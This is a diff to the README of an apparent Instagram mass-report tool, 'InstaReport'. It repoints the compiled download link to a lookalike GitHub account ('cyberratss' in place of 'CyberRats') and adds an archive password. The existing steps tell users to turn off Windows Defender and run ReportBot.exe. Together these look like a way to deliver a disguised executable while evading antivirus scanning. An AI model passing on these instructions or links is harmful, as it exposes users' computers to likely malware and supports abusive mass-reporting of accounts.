@@ -34,8 +34,8 @@ No need to install git in linux or termux
 # Usage 
 
 ### INSTALLATION [Windows]
-[Direct Download Compiled Version](https://github.com/CyberRats/InstaReport/releases/tag/v1)
-
+[Direct Download Compiled Version](https://github.com/cyberratss/InstaReport/releases/tag/v1)
+### Password: CyberRats
 * `Turn Off Windows Defender`
 * `Unzip The File`
 * `Star ReportBot.exe`
